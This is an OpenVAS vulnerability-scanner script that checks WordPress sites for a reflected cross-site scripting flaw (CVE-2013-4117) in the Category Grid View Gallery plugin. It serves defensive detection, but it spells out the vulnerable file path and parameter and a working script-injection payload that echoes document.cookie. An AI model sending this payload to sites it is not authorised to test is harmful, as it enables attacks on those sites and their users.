###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_category_gridview_gallery_xss_vuln.nasl 6086 2017-05-09 09:03:30Z teissa $
#
# WordPress Category Grid View Gallery XSS Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803681";

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6086 $");
  script_cve_id("CVE-2013-4117");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-05-09 11:03:30 +0200 (Tue, 09 May 2017) $");
  script_tag(name:"creation_date", value:"2013-07-03 16:01:07 +0530 (Wed, 03 Jul 2013)");
  script_name("WordPress Category Grid View Gallery XSS Vulnerability");

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.";

  tag_affected =
"WordPress Category Grid View Gallery Plugin version 2.3.1 and prior";

  tag_insight =
"The flaw is caused due to an input validation error in the 'ID' parameter
in '/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php'
when processing user-supplied data.";

  tag_vuldetect =
"Send the  crafted XSS query via HTTP GET nethod and confirm the vulnerability
from the response.";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

  tag_summary =
"This host is running Category Grid View Gallery plugin and is prone to cross
site scripting vulnerability.";


  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Jul/17");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wordpress-category-grid-view-gallery-xss");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122259/WordPress-Category-Grid-View-Gallery-XSS.html");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
url = "";
dir = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack request
url = dir + '/wp-content/plugins/category-grid-view-gallery/includes' +
            '/CatGridPost.php?ID="><script>alert(document.cookie)</script>';

## Check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>"))
{
  security_message(port);
  exit(0);
}
